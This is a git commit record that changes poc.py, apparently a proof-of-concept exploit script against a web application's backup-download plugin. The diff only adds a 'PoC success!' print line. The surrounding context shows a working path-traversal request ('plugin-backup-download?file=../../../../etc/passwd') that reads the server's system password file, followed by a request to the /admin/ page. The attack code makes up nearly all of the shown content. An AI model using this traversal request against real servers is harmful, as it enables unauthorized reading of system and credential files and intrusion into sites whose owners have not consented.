8c4b090f2d7c0fec2c3d294fe852adc7c822955b
xymcuc <787886660@qq.com>
2020-07-16 18:56:58 +0800

    change poc

--- poc.py
+++ poc.py
@@ -6,6 +6,7 @@ def login(host):
     burp0_url = "http://"+host+"/plugin-backup-download?file=../../../../../../../../etc/passwd"
     burp0_headers = {"Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"}
     r=requests.get(burp0_url, headers=burp0_headers)
+    print('PoC success!')
     session = requests.session()
     burp0_url = "http://"+host+"/admin/"
     r=session.get(burp0_url)
